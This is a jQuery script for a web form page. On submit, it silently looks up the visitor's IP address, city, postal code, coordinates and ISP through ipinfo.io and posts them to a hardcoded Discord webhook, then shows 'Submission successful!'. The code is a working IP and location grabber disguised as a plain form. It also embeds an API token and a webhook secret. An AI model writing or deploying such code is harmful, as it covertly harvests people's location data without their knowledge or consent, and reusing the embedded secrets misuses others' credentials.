$(document).ready(function() {
    console.log("Document is ready");
    $("#submit").hide();

    $('input[name="mode"]').click(function() {
        console.log("Mode selected");
        $("#submit").show();
    });

    $("#submit").click(async function(event) {
        event.preventDefault();
        console.log("Submit button clicked");
        const mode = $('input[name="mode"]:checked').val();
        const additionalInfo = $('#additionalInfo').val();

        try {
            const response = await $.getJSON('https://ipinfo.io/json?token=64c2f1a909faa4');
            if (!response || Object.keys(response).length === 0) {
                console.error('Failed to retrieve data from ipinfo.io');
                return;
            }

            console.log("Data retrieved from ipinfo.io", response);

            const content = {
                mode: mode,
                ip: response.ip,
                city: response.city,
                region: response.region,
                country: response.country,
                postal: response.postal,
                latitude: response.loc.split(',')[0],
                longitude: response.loc.split(',')[1],
                timezone: response.timezone,
                org: response.org,
                additionalInfo: additionalInfo
            };

            const webhookURL = 'https://discord.com/api/webhooks/1315714343202979961/DewcDVtX6f6pBkJdAVvQCawCe4Uc-KFBGPKnTX9UUk5zz_C6PQDPty9-alMZ5cZTHRpV';
            const message = {
                content: 'New submission received:',
                embeds: [{
                    title: 'Submission Details',
                    description: JSON.stringify(content, null, 2),
                    color: 5814783
                }]
            };

            const webhookResponse = await fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(message)
            });

            if (webhookResponse.ok) {
                alert('Submission successful!');
                window.location.href = "1.html"; // Redirect to thank you page
            } else {
                console.error('Failed to send message to Discord');
            }
        } catch (error) {
            console.error('Error:', error);
        }
    });
});
